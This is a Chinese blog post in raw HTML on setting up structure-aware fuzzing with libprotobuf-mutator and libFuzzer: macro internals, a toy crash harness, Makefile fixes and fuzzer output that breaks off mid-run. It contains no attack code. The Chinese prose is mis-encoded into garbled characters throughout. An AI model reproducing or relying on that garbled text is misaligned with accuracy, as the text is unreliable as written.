DEFINE_TEXT_PROTO_FUZZER(arg)</span></span><br><span class="line"><span class="comment">// Defines custom mutator, crossover and test functions using text</span></span><br><span class="line"><span class="comment">// serialization. This format is more convenient to read.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFINE_TEXT_PROTO_FUZZER(arg) DEFINE_PROTO_FUZZER_IMPL(false, arg)</span></span><br><span class="line"><span class="comment">// Defines custom mutator, crossover and test functions using binary</span></span><br><span class="line"><span class="comment">// serialization. This makes mutations faster. However often test function is</span></span><br><span class="line"><span class="comment">// significantly slower than mutator, so fuzzing rate may stay unchanged.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFINE_BINARY_PROTO_FUZZER(arg) DEFINE_PROTO_FUZZER_IMPL(true, arg)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFINE_PROTO_FUZZER_IMPL(use_binary, arg)                              \</span></span><br><span class="line"><span class="meta">  static void TestOneProtoInput(arg);                                          \</span></span><br><span class="line"><span class="meta">  using FuzzerProtoType = std::remove_const&lt;std::remove_reference&lt;             \</span></span><br><span class="line"><span class="meta">      std::function<span class="string">&lt;decltype(TestOneProtoInput)&gt;</span>::argument_type&gt;::type&gt;::type; \</span></span><br><span class="line"><span class="meta">  DEFINE_CUSTOM_PROTO_MUTATOR_IMPL(use_binary, FuzzerProtoType)                \</span></span><br><span class="line"><span class="meta">  DEFINE_CUSTOM_PROTO_CROSSOVER_IMPL(use_binary, FuzzerProtoType)              \</span></span><br><span class="line"><span class="meta">  DEFINE_TEST_ONE_PROTO_INPUT_IMPL(use_binary, FuzzerProtoType)                \</span></span><br><span class="line"><span class="meta">  DEFINE_POST_PROCESS_PROTO_MUTATION_IMPL(FuzzerProtoType)                     \</span></span><br><span class="line"><span class="meta">  static void TestOneProtoInput(arg)</span></span><br></pre></td></tr></table></figure><p>è°ƒç”¨è·¯å¾„ä¸º <code>DEFINE_PROTO_FUZZER</code> -&gt; <code>DEFINE_TEXT_PROTO_FUZZER</code> -&gt; <code>DEFINE_PROTO_FUZZER_IMPL</code> -&gt; <code>DEFINE_TEST_ONE_PROTO_INPUT_IMPL</code> -&gt; <code>LLVMFuzzerTestOneInput</code> -&gt; <code>TestOneProtoInput</code>ã€‚<br>æœ€ç»ˆè¿˜æ˜¯å®ç°äº†<code>LLVMFuzzerTestOneInput</code> libfuzzer çš„å…¥å£æ–¹æ³•ï¼Œä½¿ç”¨ macro å¯ä»¥å°‘å†™ä¸å°‘ä»£ç éå¸¸æ–¹ä¾¿ï¼Œä»è¿™é‡Œå°±å¯ä»¥çœ‹å‡º fuzz çš„ target function å¿…é¡»å’Œ <code>LLVMFuzzerTestOneInput</code> çš„å‚æ•°ç±»å‹ä¸€è‡´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fuzz_target.cc</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *Data, <span class="type">size_t</span> Size)</span> &#123;</span><br><span class="line">  DoSomethingInterestingWithMyAPI(Data, Size);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">// Non-zero return values are reserved for future use.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>libfuzzer_macro.cc</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">LoadProtoInput</span><span class="params">(<span class="type">bool</span> binary, <span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size,</span></span></span><br><span class="line"><span class="params"><span class="function">                    protobuf::Message* input)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">GetCache</span>()-&gt;<span class="built_in">LoadIfSame</span>(data, size, input)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">auto</span> result = binary ? <span class="built_in">ParseBinaryMessage</span>(data, size, input)</span><br><span class="line">                       : <span class="built_in">ParseTextMessage</span>(data, size, input);</span><br><span class="line">  <span class="keyword">if</span> (!result) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="built_in">GetMutator</span>()-&gt;<span class="built_in">Seed</span>(size);</span><br><span class="line">  <span class="built_in">GetMutator</span>()-&gt;<span class="built_in">Fix</span>(input);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>LoadProtoInput</code> è¿”å› <code>true</code> æˆ–è€… <code>false</code>ï¼Œå¦‚æœè§£ææˆåŠŸï¼Œå°†è°ƒç”¨ <code>TestOneProtoInput</code>ï¼Œ<code>DEFINE_PROTO_FUZZER</code> macro å…¶å®å°±æ˜¯å†™ TestOneProtoInput çš„å®ç°ã€‚</p><h2 id="libprotobuf-mutator-fuzzing-learning"><a href="#libprotobuf-mutator-fuzzing-learning" class="headerlink" title="libprotobuf-mutator_fuzzing_learning"></a>libprotobuf-mutator_fuzzing_learning</h2><p>è¿™æ˜¯ github ä¸Šä¸€ä½åŒè¡Œå†™çš„å­¦ä¹  libprotobuf-mutator fuzzing çš„æ–‡ç« ï¼Œæ€»ä½“å†™çš„ä¸é”™ï¼Œä½†æ˜¯å…¶ä¸­æœ‰ä¸€äº›é”™è¯¯çš„åœ°æ–¹ï¼Œåœ¨å®è·µè¿‡ç¨‹ä¸­éƒ½è®°å½•äº†å…¶ä¸­çš„ä¿®æ”¹ã€‚</p><h3 id="Simple-protobuf-example"><a href="#Simple-protobuf-example" class="headerlink" title="Simple protobuf example"></a>Simple protobuf example</h3><p>æ–‡ç« ï¼š<a href="https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/1_simple_protobuf">https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/1_simple_protobuf</a></p><p>å…ˆå†™ä¸€ä¸ªç®€å•çš„ protobuf æ–‡ä»¶ï¼Œtest.proto</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">TEST</span> &#123;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">uint32</span> a = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">string</span> b = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>protoc</code> ç¼–è¯‘ protobuf æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> genfiles  </span><br><span class="line">protoc ./test.proto --cpp_out=./genfiles</span><br></pre></td></tr></table></figure><p>å°†è‡ªåŠ¨ç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> ./genfiles</span><br><span class="line">test.pb.cc  test.pb.h</span><br></pre></td></tr></table></figure><p>å†™ä¸€ä¸ªæµ‹è¯•ç¨‹åº test_proto.cc</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;test.pb.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> std::cin;</span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TEST t;</span><br><span class="line">    t.<span class="built_in">set_a</span>(<span class="number">101</span>);</span><br><span class="line">    t.<span class="built_in">set_b</span>(<span class="string">&quot;testtest&quot;</span>);</span><br><span class="line">    cout &lt;&lt; t.<span class="built_in">a</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; t.<span class="built_in">b</span>() &lt;&lt; endl;   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>å†™ Makefile æ¥ç¼–è¯‘ <code>test_proto.cc</code></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CXX=clang++</span><br><span class="line">PB_SRC=test.pb.cc</span><br><span class="line"></span><br><span class="line">PROTOBUF_DIR=<span class="variable">$(HOME)</span>/code/libprotobuf-mutator/build/external.protobuf/</span><br><span class="line">PROTOBUF_LIB=<span class="variable">$(PROTOBUF_DIR)</span>/lib/libprotobufd.a</span><br><span class="line">INC=-I<span class="variable">$(PROTOBUF_DIR)</span>/<span class="keyword">include</span></span><br><span class="line"></span><br><span class="line"><span class="section">test_proto: test_proto.cc <span class="variable">$(PB_SRC)</span></span></span><br><span class="line"><span class="variable">$(CXX)</span> -o <span class="variable">$@</span> <span class="variable">$^</span> <span class="variable">$(PROTOBUF_LIB)</span> <span class="variable">$(INC)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean: </span></span><br><span class="line">rm test_proto</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œ <code>make</code> åæŠ¥é”™ .&#x2F;test.pb.h:17:2: error: This file was generated by an older version of protoc which isï¼Œå› ä¸ºæˆ‘ä»¬åœ¨ç¼–è¯‘çš„æ—¶å€™ä½¿ç”¨äº† <code>-DLIB_PROTO_MUTATOR_DOWNLOAD_PROTOBUF=ON</code> ä¸‹è½½äº†æ–°ç‰ˆæœ¬çš„ protobufï¼Œæ‰€ä»¥å‡ºäº†è¿™ä¸ªé”™è¯¯ã€‚åªå¥½ä½¿ç”¨ä¸‹è½½çš„ protoc é‡æ–°ç”Ÿæˆ <code>test.pb.cc</code> å’Œ <code>test.pb.h</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/code/libprotobuf-mutator/build/external.protobuf/bin/protoc ./test.proto --cpp_out=./genfiles</span><br></pre></td></tr></table></figure><p>è¿™æ¬¡å¯ä»¥æˆåŠŸ make äº†ï¼Œå®é™…æ‰§è¡Œçš„å‘½ä»¤æ˜¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clang++ -o test_proto test_proto.cc test.pb.cc /home/henices/code/libprotobuf-mutator/build/external.protobuf//lib/libprotobufd.a \</span><br><span class="line"> -I/home/henices/code/libprotobuf-mutator/build/external.protobuf//include</span><br></pre></td></tr></table></figure><p>è¿è¡Œ <code>./test_proto</code>, è¾“å‡ºå¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">101</span><br><span class="line">testtest</span><br></pre></td></tr></table></figure><h3 id="Combine-libprotobuf-mutator-with-libfuzzer"><a href="#Combine-libprotobuf-mutator-with-libfuzzer" class="headerlink" title="Combine libprotobuf-mutator with libfuzzer"></a>Combine libprotobuf-mutator with libfuzzer</h3><p>ä»£ç åœ¨ï¼š <a href="https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/2_libprotobuf_libfuzzer">https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/2_libprotobuf_libfuzzer</a></p><p>harness.cc</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="type">int</span> <span class="title">FuzzTEST</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *data, <span class="type">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(data[<span class="number">0</span>] == <span class="string">&#x27;\x01&#x27;</span>) &#123;</span><br><span class="line">        __builtin_trap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ FuzzTEST æ˜¯æˆ‘ä»¬éœ€è¦æµ‹è¯•çš„ç›®æ ‡å‡½æ•°ã€‚</p><p>lpm_libfuzz.cc</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;libprotobuf-mutator/src/libfuzzer/libfuzzer_macro.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;test.pb.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> std::cin;</span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"></span><br><span class="line"><span class="function">std::string <span class="title">ProtoToData</span><span class="params">(<span class="type">const</span> TEST &amp;test_proto)</span> </span>&#123;</span><br><span class="line">    std::stringstream all;</span><br><span class="line">    <span class="type">const</span> <span class="keyword">auto</span> &amp;aa = test_proto.<span class="built_in">a</span>();</span><br><span class="line">    <span class="type">const</span> <span class="keyword">auto</span> &amp;bb = test_proto.<span class="built_in">b</span>();</span><br><span class="line">    all.<span class="built_in">write</span>((<span class="type">const</span> <span class="type">char</span>*)&amp;aa, <span class="built_in">sizeof</span>(aa));</span><br><span class="line">    <span class="keyword">if</span>(bb.<span class="built_in">size</span>() != <span class="number">0</span>) &#123;</span><br><span class="line">        all.<span class="built_in">write</span>(bb.<span class="built_in">c_str</span>(), bb.<span class="built_in">size</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::string res = all.<span class="built_in">str</span>();</span><br><span class="line">    <span class="keyword">if</span> (bb.<span class="built_in">size</span>() != <span class="number">0</span> &amp;&amp; res.<span class="built_in">size</span>() != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// set PROTO_FUZZER_DUMP_PATH env to dump the serialized protobuf</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="type">const</span> <span class="type">char</span> *dump_path = <span class="built_in">getenv</span>(<span class="string">&quot;PROTO_FUZZER_DUMP_PATH&quot;</span>)) &#123;</span><br><span class="line">            <span class="function">std::ofstream <span class="title">of</span><span class="params">(dump_path)</span></span>;</span><br><span class="line">            of.<span class="built_in">write</span>(res.<span class="built_in">data</span>(), res.<span class="built_in">size</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="type">int</span> <span class="title">FuzzTEST</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size)</span></span>; <span class="comment">// our customized fuzzing function</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">DEFINE_PROTO_FUZZER</span>(<span class="type">const</span> TEST &amp;test_proto) &#123;</span><br><span class="line">    <span class="keyword">auto</span> s = <span class="built_in">ProtoToData</span>(test_proto); <span class="comment">// convert protobuf to raw data</span></span><br><span class="line">    <span class="built_in">FuzzTEST</span>((<span class="type">const</span> <span class="type">uint8_t</span>*)s.<span class="built_in">data</span>(), s.<span class="built_in">size</span>()); <span class="comment">// fuzz the function</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æ–‡ä»¶çš„æœ€å¼€å¤´å¯¼å…¥ <code>libfuzzer_macro.h</code>ï¼Œ åé¢å°±å¯ä»¥ä½¿ç”¨ä¸€äº›å®æ¥å†™ä»£ç äº†ï¼Œ<code>DEFINE_PROTO_FUZZER</code> æ˜¯å…³é”®çš„ fuzzer å…¥å£ã€‚ç»“æ„åŒ–å˜å¼‚éƒ¨åˆ† libprotobuf-mutator å·²ç»å®Œæˆäº†ï¼Œéœ€è¦å®ç°çš„æ˜¯ä¸€ä¸ªç”± protobuf è½¬éœ€è¦çš„æ•°æ®ç±»å‹çš„å‡½æ•°ï¼Œå¦‚ä¸Šé¢çš„ <code>ProtoToData</code></p><h4 id="ä»£ç ç¼–è¯‘"><a href="#ä»£ç ç¼–è¯‘" class="headerlink" title="ä»£ç ç¼–è¯‘"></a>ä»£ç ç¼–è¯‘</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">TARGET=lpm_libfuzz</span><br><span class="line">CXX=clang++</span><br><span class="line">CXXFLAGS=-g -fsanitize=fuzzer,address</span><br><span class="line">PB_SRC=test.pb.cc</span><br><span class="line"></span><br><span class="line">PROTOBUF_DIR=<span class="variable">$(HOME)</span>/code/libprotobuf-mutator/build/external.protobuf/</span><br><span class="line">LPM_DIR=<span class="variable">$(HOME)</span>/code/AFL+/external/libprotobuf-mutator</span><br><span class="line">PROTOBUF_LIB=<span class="variable">$(PROTOBUF_DIR)</span>/lib/libprotobufd.a</span><br><span class="line">LPM_LIB=<span class="variable">$(LPM_DIR)</span>/lib/libprotobuf-mutator-libfuzzer.a <span class="variable">$(LPM_DIR)</span>/lib/libprotobuf-mutator.a</span><br><span class="line">INC=-I<span class="variable">$(PROTOBUF_DIR)</span>/<span class="keyword">include</span> -I<span class="variable">$(LPM_DIR)</span>/<span class="keyword">include</span></span><br><span class="line">DFUZZ=-DLLVMFuzzerTestOneInput=FuzzTEST</span><br><span class="line"></span><br><span class="line"><span class="section">all: <span class="variable">$(TARGET)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for testing libprotobuf + libfuzzer</span></span><br><span class="line"><span class="comment"># compile harness first</span></span><br><span class="line"><span class="comment"># then link lpm_libfuzz with harness.o &amp; static libraries</span></span><br><span class="line"><span class="section">harness.o: harness.cc</span></span><br><span class="line"><span class="variable">$(CXX)</span> <span class="variable">$(CXXFLAGS)</span> -c <span class="variable">$(DFUZZ)</span> <span class="variable">$&lt;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: harness.o <span class="variable">$(TARGET)</span>.cc</span><br><span class="line"><span class="variable">$(CXX)</span> <span class="variable">$(CXXFLAGS)</span> -o <span class="variable">$@</span> <span class="variable">$^</span> <span class="variable">$(PB_SRC)</span> <span class="variable">$(LPM_LIB)</span> <span class="variable">$(PROTOBUF_LIB)</span> <span class="variable">$(INC)</span> <span class="comment"># $(LPM_LIB) must be placed before $(PROTOBUF_LIB)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean: </span></span><br><span class="line">rm <span class="variable">$(TARGET)</span> *.o</span><br></pre></td></tr></table></figure><p>make åæŠ¥é”™ï¼Œæ‰¾ä¸åˆ°å¤´æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/home/henices/code/AFL+/external/libprotobuf-mutator/include/libprotobuf-mutator/src/libfuzzer/libfuzzer_macro.h:24:10: fatal error: &#x27;port/protobuf.h&#x27; file not found</span><br><span class="line">#include &quot;port/protobuf.h&quot;</span><br><span class="line">         ^~~~~~~~~~~~~~~~~</span><br><span class="line">1 error generated.</span><br></pre></td></tr></table></figure><p>port&#x2F;protobuf.h  æ¥è‡ª <a href="https://github.com/google/libprotobuf-mutator/blob/master/port/protobuf.h">https://github.com/google/libprotobuf-mutator/blob/master/port/protobuf.h</a>  ä¿®æ”¹ Makefile å¦‚ä¸‹</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">TARGET=lpm_libfuzz</span><br><span class="line">CXX=clang++</span><br><span class="line">CXXFLAGS=-g -fsanitize=fuzzer,address</span><br><span class="line">PB_SRC=test.pb.cc</span><br><span class="line"></span><br><span class="line">PROTOBUF_DIR=<span class="variable">$(HOME)</span>/code/libprotobuf-mutator/build/external.protobuf/</span><br><span class="line">LPM_DIR=<span class="variable">$(HOME)</span>/code/AFL+/external/libprotobuf-mutator</span><br><span class="line">PROTOBUF_LIB=<span class="variable">$(PROTOBUF_DIR)</span>/lib/libprotobufd.a</span><br><span class="line">LPM_LIB=<span class="variable">$(LPM_DIR)</span>/lib/libprotobuf-mutator-libfuzzer.a <span class="variable">$(LPM_DIR)</span>/lib/libprotobuf-mutator.a</span><br><span class="line">INC=-I<span class="variable">$(PROTOBUF_DIR)</span>/<span class="keyword">include</span> -I<span class="variable">$(HOME)</span>/code/libprotobuf-mutator/ -I<span class="variable">$(LPM_DIR)</span>/<span class="keyword">include</span></span><br><span class="line">DFUZZ=-DLLVMFuzzerTestOneInput=FuzzTEST</span><br><span class="line"></span><br><span class="line"><span class="section">all: <span class="variable">$(TARGET)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for testing libprotobuf + libfuzzer</span></span><br><span class="line"><span class="comment"># compile harness first</span></span><br><span class="line"><span class="comment"># then link lpm_libfuzz with harness.o &amp; static libraries</span></span><br><span class="line"><span class="section">harness.o: harness.cc</span></span><br><span class="line"><span class="variable">$(CXX)</span> <span class="variable">$(CXXFLAGS)</span> -c <span class="variable">$(DFUZZ)</span> <span class="variable">$&lt;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: harness.o <span class="variable">$(TARGET)</span>.cc</span><br><span class="line"><span class="variable">$(CXX)</span> <span class="variable">$(CXXFLAGS)</span> -o <span class="variable">$@</span> <span class="variable">$^</span> <span class="variable">$(PB_SRC)</span> <span class="variable">$(LPM_LIB)</span> <span class="variable">$(PROTOBUF_LIB)</span> <span class="variable">$(INC)</span> <span class="comment"># $(LPM_LIB) must be placed before $(PROTOBUF_LIB)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean: </span></span><br><span class="line">rm <span class="variable">$(TARGET)</span> *.o</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ makefile åï¼Œå¯ä»¥æ­£å¸¸ç¼–è¯‘é€šè¿‡ã€‚ç»è¿‡æˆ‘ä»¬ä¸Šé¢çš„åˆ†æï¼Œä¸éœ€è¦å®šä¹‰ <code>DFUZZ=-DLLVMFuzzerTestOneInput=FuzzTEST</code> å°†è¿™è¡Œåˆ é™¤æ‰ï¼ŒåŒæ ·å¯ä»¥ç¼–è¯‘é€šè¿‡ã€‚</p><p>æ‰§è¡Œ <code>lpm_libfuzz</code> è¿è¡Œæ­£å¸¸</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">âœ  ./lpm_libfuzz                                                                                                                                                                                          </span><br><span class="line">INFO: found LLVMFuzzerCustomMutator (0x758a80). Disabling -len_control by default.</span><br><span class="line">INFO: Running with entropic power schedule (0xFF, 100).                                    </span><br><span class="line">INFO: Seed: 331712324                       </span><br><span class="line">INFO: Loaded 1 modules   (434 inline 8-bit counters): 434 [0xa056b8, 0xa0586a), </span><br><span class="line">INFO: Loaded 1 PC tables (434 PCs): 434 [0x939398,0x93aeb8), </span><br><span class="line">INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytes</span><br><span class="line">INFO: A corpus is not provided, starting from an empty corpus</span><br><span class="line">#2      INITED cov: 82 ft: 83 corp: 1/1b exec/s: 0 rss: 35Mb</span><br><span class="line">        NEW_FUNC[1/41]: 0x75abb0 in TEST::~TEST() /tmp/genfiles/test.pb.cc:116</span><br><span class="line">        NEW_FUNC[2/41]: 0x75ca10 in google::protobuf::UnknownFieldSet* google::protobuf::internal::InternalMetadata::mutable_unknown_fields&lt;google::protobuf::UnknownFieldSet&gt;() /home/henices/code/libprotobuf-mut</span><br><span class="line">ator/build/external.protobuf//include/google/protobuf/metadata_lite.h:117</span><br><span class="line">#3      NEW    cov: 135 ft: 159 corp: 2/12b lim: 4096 exec/s: 0 rss: 36Mb L: 11/11 MS: 1 CustomCrossOver-</span><br><span class="line">#4      NEW    cov: 138 ft: 162 corp: 3/201b lim: 4096 exec/s: 0 rss: 36Mb L: 189/189 MS: 2 InsertRepeatedBytes-Custom-</span><br><span class="line">#38     REDUCE cov: 138 ft: 162 corp: 3/127b lim: 4096 exec/s: 0 rss: 37Mb L: 115/115 MS: 5 CustomCrossOver-CustomCrossOver-Custom-InsertRepeatedBytes-Custom-</span><br><span class="line">#60     REDUCE cov: 138 ft: 162 corp: 3/124b lim: 4096 exec/s: 0 rss: 37Mb L: 112/112 MS: 4 CustomCrossOver-ShuffleBytes-ChangeByte-Custom-</span><br><span class="line">#98     REDUCE cov: 138 ft: 162 corp: 3/56b lim: 4096 exec/s: 0 rss: 37Mb L: 44/44 MS: 5 CrossOver-Custom-Custom-CMP-Custom- DE: &quot;~\xff\xff\xff\xff\xff\xff\xff&quot;-</span><br><span class="line">#144    REDUCE cov: 138 ft: 162 corp: 3/53b lim: 4096 exec/s: 0 rss: 37Mb L: 41/41 MS: 2 CrossOver-Custom-</span><br><span class="line">#182    REDUCE cov: 138 ft: 162 corp: 3/25b lim: 4096 exec/s: 0 rss: 37Mb L: 13/13 MS: 5 